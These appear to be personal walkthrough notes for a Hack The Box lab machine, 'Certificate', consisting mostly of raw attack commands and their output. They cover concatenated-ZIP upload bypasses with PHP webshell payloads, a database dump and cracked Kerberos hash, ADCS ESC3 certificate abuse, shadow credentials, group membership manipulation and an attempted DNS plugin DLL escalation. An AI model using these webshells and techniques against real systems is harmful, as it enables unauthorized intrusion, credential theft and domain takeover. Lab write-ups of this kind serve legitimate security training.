

```python
kali@kali ~> nmap -sC -sV -Pn 10.129.116.45
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-31 19:35 EDT
Nmap scan report for 10.129.116.45
Host is up (0.072s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
|_http-title: Did not follow redirect to http://certificate.htb/
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-01 03:15:18Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-01T03:16:54+00:00; +3h40m03s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-01T03:16:53+00:00; +3h40m02s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-01T03:16:54+00:00; +3h40m03s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
|_ssl-date: 2025-06-01T03:16:53+00:00; +3h40m02s from scanner time.
Service Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3h40m01s, deviation: 2s, median: 3h40m01s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-06-01T03:16:12
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.55 seconds
```



```python
kali@kali ~>  nxc smb 10.129.116.45
SMB         10.129.116.45   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certificate.htb) (signing:True) (SMBv1:False)
```


so its a web IA, it takes the ZIP files and unzips them 


the storage location of the PDF does NOT change

```
http://certificate.htb/static/uploads/346f96e85d110b7cfb38fe3b00565313/SystemsExamSawyer.pdf
```


when testing a php5 payload inside of the zip file I got failed to open zip file



```
echo "<?php system(\$_GET['cmd']); ?>" > webshell.php

# Make a safe "decoy" zip (harmless looking)
7zz a safe.zip systemsprogrammingexam.pdf

# Create a zip with just the malicious webshell
7zz a shell.zip webshell.php

# Concatenate the two zips (safe + payload)
cat safe.zip shell.zip > combined.zip

```


what kind of webshells can be used?, there was a blacklist filter on the PHP too, it was probably because it was executing things with `system` rather than `shell_exec` or `0`


```python
// What was getting filtered
<?php system(\$_GET['cmd']); ?> 

// What Works
<?=`$_GET[0]`?>  
<?php echo shell_exec($_GET['cmd']);?>  
<?php echo shell_exec("whoami");?> 

// Misc Odd, Barely gives any output this one but works, recieves commands
<?php echo exec($_GET['cmd']);?>

```



```python
PS C:\xampp> cat apache_start.bat
@echo off
cd /D %~dp0
echo Diese Eingabeforderung nicht waehrend des Running beenden
echo Bitte erst bei einem gewollten Shutdown schliessen
echo Please close this command only for Shutdown
echo Apache 2 is starting ...

apache\bin\httpd.exe

if errorlevel 255 goto finish
if errorlevel 1 goto error
goto finish

:error
echo.
echo Apache konnte nicht gestartet werden
echo Apache could not be started
pause

:finish
PS C:\xampp> cat passwords.txt
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)

2) FileZilla FTP:

   [ You have to create a new user on the FileZilla Interface ] 

3) Mercury (not in the USB & lite version): 

   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser  
   Password: wampp 

4) WEBDAV: 

   User: xampp-dav-unsecure
   Password: ppmax2011
   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
   For activation please comment out the httpd-dav.conf and
   following modules in the httpd.conf

```



```python
PS C:\xampp> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
licenses\msmtp\COPYING.txt
mysql\bin\my.ini
mysql\share\errmsg-utf8.txt
passwords.txt
php\data\phpdocref\ssh2\versions.xml
php\extras\mibs\SNMP-USM-DH-OBJECTS-MIB.txt
php\news.txt
php\pear\PEAR\Command\Auth.xml
php\pear\PEAR\Command\Channels.xml
php\php.ini
php\php.ini-development
php\php.ini-production
php\readme-redist-bins.txt
php\windowsXamppPhp\news.txt
php\windowsXamppPhp\php.ini-development
php\windowsXamppPhp\php.ini-production
php\windowsXamppPhp\readme-redist-bins.txt
phpMyAdmin\doc\html\_sources\config.rst.txt
phpMyAdmin\doc\html\_sources\faq.rst.txt
phpMyAdmin\doc\html\_sources\intro.rst.txt
phpMyAdmin\doc\html\_sources\privileges.rst.txt
phpMyAdmin\doc\html\_sources\setup.rst.txt
phpMyAdmin\doc\html\_sources\two_factor.rst.txt
phpMyAdmin\vendor\tecnickcom\tcpdf\LICENSE.TXT
readme_de.txt
readme_en.txt
webdav\webdav.txt

```



```
findstr /SIM /C:"pass" *.txt *.ini *.cfg *.config *.xml
```


```python
PS C:\xampp> findstr /SIM /C:"pass" *.txt *.ini *.cfg *.config *.xml 
apache\ABOUT_APACHE.txt
apache\LICENSE.txt
licenses\adodb\license.txt
licenses\aspell\COPYING.txt
licenses\FileZillaFTP\license.txt
licenses\freetype\GPL.txt
licenses\GeoIP\COPYING.txt
licenses\httpd\LICENSE.txt
licenses\libmbfl\LICENSE.txt
licenses\msmtp\COPYING.txt
licenses\pbxt\COPYING.txt
licenses\pdflib\license.txt
licenses\strawberry\licenses\dmake\license.txt
licenses\strawberry\licenses\libfreetype\GPL.TXT
licenses\t1lib\LICENSE.txt
licenses\xampp\gpl.txt
mysql\bin\my.ini
mysql\share\errmsg-utf8.txt
passwords.txt
php\data\phpdocref\spl\versions.xml
php\data\phpdocref\ssh2\versions.xml
php\data\phpdocref\zlib\versions.xml
php\extras\mibs\DISMAN-EXPRESSION-MIB.txt
php\extras\mibs\DISMAN-PING-MIB.txt
php\extras\mibs\DISMAN-SCHEDULE-MIB.txt
php\extras\mibs\DISMAN-SCRIPT-MIB.txt
php\extras\mibs\DISMAN-TRACEROUTE-MIB.txt
php\extras\mibs\EtherLike-MIB.txt
php\extras\mibs\IF-MIB.txt
php\extras\mibs\IPV6-MIB.txt
php\extras\mibs\MTA-MIB.txt
php\extras\mibs\NET-SNMP-PASS-MIB.txt
php\extras\mibs\NOTIFICATION-LOG-MIB.txt
php\extras\mibs\RFC1213-MIB.txt
php\extras\mibs\RMON-MIB.txt
php\extras\mibs\SCTP-MIB.txt
php\extras\mibs\SNMP-MPD-MIB.txt
php\extras\mibs\SNMP-USM-DH-OBJECTS-MIB.txt
php\extras\mibs\SNMPv2-MIB.txt
php\extras\mibs\TCP-MIB.txt
php\extras\mibs\UCD-DEMO-MIB.txt
php\extras\mibs\UCD-IPFILTER-MIB.txt
php\extras\mibs\UCD-SNMP-MIB.txt
php\news.txt
php\pear\adodb\license.txt
php\pear\adodb\pear\readme.Auth.txt
php\pear\PEAR\Command\Auth.xml
php\pear\PEAR\Command\Channels.xml
php\pear\PEAR\Command\Package.xml
php\pear\PEAR\Command\Remote.xml
php\pear\PEAR\Command\Test.xml
php\php.ini
php\php.ini-development
php\php.ini-production
php\readme-redist-bins.txt
php\windowsXamppPhp\news.txt
php\windowsXamppPhp\php.ini-development
php\windowsXamppPhp\php.ini-production
php\windowsXamppPhp\readme-redist-bins.txt
phpMyAdmin\doc\html\_sources\config.rst.txt
phpMyAdmin\doc\html\_sources\faq.rst.txt
phpMyAdmin\doc\html\_sources\glossary.rst.txt
phpMyAdmin\doc\html\_sources\intro.rst.txt
phpMyAdmin\doc\html\_sources\privileges.rst.txt
phpMyAdmin\doc\html\_sources\setup.rst.txt
phpMyAdmin\doc\html\_sources\themes.rst.txt
phpMyAdmin\doc\html\_sources\transformations.rst.txt
phpMyAdmin\doc\html\_sources\two_factor.rst.txt
phpMyAdmin\vendor\phpmyadmin\sql-parser\LICENSE.txt
phpMyAdmin\vendor\tecnickcom\tcpdf\CHANGELOG.TXT
phpMyAdmin\vendor\tecnickcom\tcpdf\LICENSE.TXT
readme_de.txt
readme_en.txt
webdav\webdav.txt

```



```python
// Database connection using PDO
try {
    $dsn = 'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4';
    $db_user = 'certificate_webapp_user'; // Change to your DB username
    $db_passwd = 'cert!f!c@teDBPWD'; // Change to your DB password
    $options = [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ];
    $pdo = new PDO($dsn, $db_user, $db_passwd, $options);
} catch (PDOException $e) {
    die('Database connection failed: ' . $e->getMessage());
}
?>
```


```
PS C:\xampp\mysql\bin> .\mysql.exe -u certificate_webapp_user -pcert!f!c@teDBPWD -e 'show databases;'
Database
certificate_webapp_db
information_schema
test
```


```python
PS C:\xampp\mysql\bin> .\mysql.exe -u certificate_webapp_user -pcert!f!c@teDBPWD -e 'show databases; use certificate_webapp_db; show tables; select * from users'
Database
certificate_webapp_db
information_schema
test
Tables_in_certificate_webapp_db
course_sessions
courses
users
users_courses
id      first_name      last_name       username        email   password        created_at      role    is_active
1       Lorra   Armessa Lorra.AAA       lorra.aaa@certificate.htb       $2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG    2024-12-23 12:43:10     teacher 1
6       Sara    Laracrof        Sara1200        sara1200@gmail.com      $2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK    2024-12-23 12:47:11     teacher 1
7       John    Wood    Johney  johny009@mail.com       $2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq    2024-12-23 13:18:18     student 1
8       Havok   Watterson       havokww havokww@hotmail.com     $2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti    2024-12-24 09:08:04     teacher 1
9       Steven  Roman   stev    steven@yahoo.com        $2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2    2024-12-24 12:05:05     student 1
10      Sara    Brawn   sara.b  sara.b@certificate.htb  $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6    2024-12-25 21:31:26     admin   1
12      Sawyer  ellsworth       sawyer  something@gmail.com     $2y$04$N7nsOSNpmvS8xCD.rbpz6ujoNOpzqFa0X1qR4iTKm4Z7QOdQUa1EW    2025-06-03 21:53:58     student 1

```



```
id      first_name      last_name       username        email   password        created_at      role    is_active
1       Lorra   Armessa Lorra.AAA       lorra.aaa@certificate.htb       $2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG    2024-12-23 12:43:10     teacher 1
6       Sara    Laracrof        Sara1200        sara1200@gmail.com      $2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK    2024-12-23 12:47:11     teacher 1
7       John    Wood    Johney  johny009@mail.com       $2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq    2024-12-23 13:18:18     student 1
8       Havok   Watterson       havokww havokww@hotmail.com     $2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti    2024-12-24 09:08:04     teacher 1
9       Steven  Roman   stev    steven@yahoo.com        $2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2    2024-12-24 12:05:05     student 1
10      Sara    Brawn   sara.b  sara.b@certificate.htb  $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6    2024-12-25 21:31:26     admin   1
12      Sawyer  ellsworth       sawyer  something@gmail.com     $2y$04$N7nsOSNpmvS8xCD.rbpz6ujoNOpzqFa0X1qR4iTKm4Z7QOdQUa1EW    2025-06-03 21:53:58     student 1

```



```
$2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG
$2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK
$2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq
$2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti
$2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2
$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6
$2y$04$N7nsOSNpmvS8xCD.rbpz6ujoNOpzqFa0X1qR4iTKm4Z7QOdQUa1EW
```



```
kali@kali ~> nxc smb 10.129.26.68 -u 'Sara.b' -p 'Blink182'
SMB         10.129.26.68    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certificate.htb) (signing:True) (SMBv1:False)
SMB         10.129.26.68    445    DC01             [+] certificate.htb\Sara.b:Blink182 
```



```
*Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01> download Description.txt
                                        
Info: Downloading C:\Users\Sara.B\Documents\WS-01\Description.txt to Description.txt
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01> download WS-01_PktMon.pcap
                                        
Info: Downloading C:\Users\Sara.B\Documents\WS-01\WS-01_PktMon.pcap to WS-01_PktMon.pcap
                                        
Info: Download successful!

```



```
kali@kali ~/H/C/A/Krb5RoastParser (main)> python krb5_roast_parser.py /home/kali/WS-01_PktMon.pcap as_req
$krb5pa$18$Lion.SK$CERTIFICATE$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0
```





https://github.com/jalvarezz13/Krb5RoastParser

```python
Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0:!QAZ2wsx
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 19900 (Kerberos 5, etype 18, Pre-Auth)
Hash.Target......: $krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7...e852f0
Time.Started.....: Tue Jun  3 20:38:25 2025 (8 secs)
Time.Estimated...: Tue Jun  3 20:38:33 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     1938 H/s (5.99ms) @ Accel:32 Loops:512 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 13952/14344385 (0.10%)
Rejected.........: 0/13952 (0.00%)
Restore.Point....: 13824/14344385 (0.10%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:3584-4095
Candidate.Engine.: Device Generator
Candidates.#1....: goodman -> garage
Hardware.Mon.#1..: Util: 99%

Started: Tue Jun  3 20:38:24 2025
Stopped: Tue Jun  3 20:38:35 2025

```


```python
*Evil-WinRM* PS C:\Program FIles\Automation Scripts> cat start-webapp.bat
start C:\xampp\apache_start.bat
start C:\xampp\mysql_start.bat
```


the rest of automation is denied access. i doubt these files have much but ill search in em anwyays





- shoulda tried harder on the shells, just because 1 shell didnt work it doesnt mean every shell wont work i already know that the file is uploaded and thta it exists since its getting deleted so its the shell
- dont overcomplicate, just enumeration




```python
Certificate Templates        
  0                           
    Template Name                       : Delegated-CRA
    Display Name                        : Delegated-CRA                                                               
    Certificate Authorities             : Certificate-LTD-CA        
    Enabled                             : True                                                                        
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn                                                        
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail 
                                          SubjectRequireDirectoryPath                  
    Enrollment Flag                     : IncludeSymmetricAlgorithms      
                                          PublishToDs                                                                 
                                          AutoEnrollment                                                              
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Certificate Request Agent                                                   
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0    
    Schema Version                      : 2       
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048                                                                        
    Template Created                    : 2024-11-05T19:52:09+00:00                                                   
    Template Last Modified              : 2024-11-05T19:52:10+00:00     
    Permissions    
      Enrollment Permissions                                                                                          
        Enrollment Rights               : CERTIFICATE.HTB\Domain CRA Managers
                                          CERTIFICATE.HTB\Domain Admins    
                                          CERTIFICATE.HTB\Enterprise Admins
      Object Control Permissions                                                                                      
        Owner                           : CERTIFICATE.HTB\Administrator    
        Full Control Principals         : CERTIFICATE.HTB\Domain Admins      
                                          CERTIFICATE.HTB\Enterprise Admins                                           
        Write Owner Principals          : CERTIFICATE.HTB\Domain Admins                                               
                                          CERTIFICATE.HTB\Enterprise Admins                                           
        Write Dacl Principals           : CERTIFICATE.HTB\Domain Admins                                               
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFICATE.HTB\Domain Admins                                               
                                          CERTIFICATE.HTB\Enterprise Admins                                           
    [+] User Enrollable Principals      : CERTIFICATE.HTB\Domain CRA Managers                                         
    [!] Vulnerabilities                        
      ESC3                              : Template has Certificate Request Agent EKU set.                             

```


Second targetted template to use

```python
  1
    Template Name                       : SignedUser
    Display Name                        : Signed User
    Certificate Authorities             : Certificate-LTD-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    RA Application Policies             : Certificate Request Agent
    Authorized Signatures Required      : 1
    Schema Version                      : 2
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-03T23:51:13+00:00
    Template Last Modified              : 2024-11-03T23:51:14+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Domain Users
                                          CERTIFICATE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFICATE.HTB\Administrator
        Full Control Principals         : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Domain Users
                                          CERTIFICATE.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFICATE.HTB\Domain Users
    [*] Remarks
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template requires a signature with the Certificate Request Agent application policy.

```


```python
kali@kali ~/H/C/certs> certipy req -u 'lion.sk' -p '!QAZ2wsx' -target DC01.CERTIFICATE.HTB -ca 'Certificate-LTD-CA' -template 'signeduser' -on-behalf-of 'ryan.k'  -pfx '../lion.sk.pfx'  -dc-ip 10.129.172.197
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 32
[*] Successfully requested certificate
[*] Got certificate with UPN 'ryan.k@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Saving certificate and private key to 'ryan.k.pfx'
[*] Wrote certificate and private key to 'ryan.k.pfx'
```





```python
kali@kali ~/PKINITtools (master)> python gettgtpkinit.py -cert-pfx ~/HTB/Certificate/certs/ryan.k.pfx 'certificate.htb/ryan.k' ryan.cacche
2025-06-04 17:02:12,511 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-06-04 17:02:12,578 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-06-04 17:02:15,907 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-06-04 17:02:15,907 minikerberos INFO     a4900207dec59f91b5d1d618fdc30952b0bb194107bb314eb837d82e18059abe
INFO:minikerberos:a4900207dec59f91b5d1d618fdc30952b0bb194107bb314eb837d82e18059abe
2025-06-04 17:02:15,909 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file

```



```
kali@kali ~/PKINITtools (master)> python getnthash.py certificate.htb/ryan.k -key a4900207dec59f91b5d1d618fdc30952b0bb194107bb314eb837d82e18059abe
Impacket v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
b1bc3d70e70f4f36b1509a65ae1a2ae6
```







----



```
kali@kali ~/H/Certificate> certipy shadow auto -u 'sara.b'@certificate.htb -p 'Blink182'  -account 'WS-01$'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: CERTIFICATE.HTB.
[!] Use -debug to print a stacktrace
[*] Targeting user 'WS-01$'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'a07349f7-8fc4-e95d-aae4-3980be36a3d3'
[*] Adding Key Credential with device ID 'a07349f7-8fc4-e95d-aae4-3980be36a3d3' to the Key Credentials for 'WS-01$'
[*] Successfully added Key Credential with device ID 'a07349f7-8fc4-e95d-aae4-3980be36a3d3' to the Key Credentials for 'WS-01$'
[*] Authenticating as 'WS-01$' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ws-01$@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ws-01.ccache'
[*] Wrote credential cache to 'ws-01.ccache'
[*] Trying to retrieve NT hash for 'ws-01$'
[*] Restoring the old Key Credentials for 'WS-01$'
[*] Successfully restored the old Key Credentials for 'WS-01$'
[*] NT hash for 'WS-01$': 3641f1cd0daa8dfe41e1d1b2dbbed6f4

```


```
kali@kali ~/H/C/certs [255]> net rpc group addmem "domain storage managers" 'WS-01$' -U "certificate.htb"/"sara.b"%"Blink182" -S "10.129.172.197"
```






```python
kali@kali ~/H/Certificate> net rpc group addmem "HYPER-V ADMINISTRATORS" "sara.b" -U "certificate.htb"/"sara.b"%"Blink182" -S "10.129.172.197"
kali@kali ~/H/Certificate> bloodyAD --host 10.129.172.197 -d certificate.htb -u 'sara.b' -p 'Blink182' get membership sara.b

distinguishedName: CN=Users,CN=Builtin,DC=certificate,DC=htb
objectSid: S-1-5-32-545
sAMAccountName: Users

distinguishedName: CN=Account Operators,CN=Builtin,DC=certificate,DC=htb
objectSid: S-1-5-32-548
sAMAccountName: Account Operators

distinguishedName: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=certificate,DC=htb
objectSid: S-1-5-32-554
sAMAccountName: Pre-Windows 2000 Compatible Access

distinguishedName: CN=Remote Desktop Users,CN=Builtin,DC=certificate,DC=htb
objectSid: S-1-5-32-555
sAMAccountName: Remote Desktop Users

distinguishedName: CN=Hyper-V Administrators,CN=Builtin,DC=certificate,DC=htb
objectSid: S-1-5-32-578
sAMAccountName: Hyper-V Administrators

distinguishedName: CN=Remote Management Users,CN=Builtin,DC=certificate,DC=htb
objectSid: S-1-5-32-580
sAMAccountName: Remote Management Users

distinguishedName: CN=Domain Users,CN=Users,DC=certificate,DC=htb
objectSid: S-1-5-21-515537669-4223687196-3249690583-513
sAMAccountName: Domain Users

distinguishedName: CN=Help Desk,CN=Users,DC=certificate,DC=htb
objectSid: S-1-5-21-515537669-4223687196-3249690583-1110
sAMAccountName: Help Desk

```




```python
*Evil-WinRM* PS C:\Users\Sara.B\Documents> Get-Module -ListAvailable -Name Hyper-V
*Evil-WinRM* PS C:\Users\Sara.B\Documents> Get-WindowsOptionalFeature -Online | Where-Object {$_.FeatureName -like "*Hyper-V*"}
The requested operation requires elevation.

At line:1 char:1
+ Get-WindowsOptionalFeature -Online | Where-Object {$_.FeatureName -li ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Get-WindowsOptionalFeature], COMException
    + FullyQualifiedErrorId : Microsoft.Dism.Commands.GetWindowsOptionalFeatureCommand

```



```python
*Evil-WinRM* PS C:\Users\Sara.B\Documents> upload adduser.dll
                                        
Info: Uploading /home/kali/adduser.dll to C:\Users\Sara.B\Documents\adduser.dll
                                        
Data: 12288 bytes of 12288 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\Sara.B\Documents> dnscmd.exe /config /serverlevelplugindll C:\Users\sara.b\documents\adduser.dll

DNS Server failed to reset registry property.
    Status = 5 (0x00000005)
Command failed:  ERROR_ACCESS_DENIED     5    0x5


```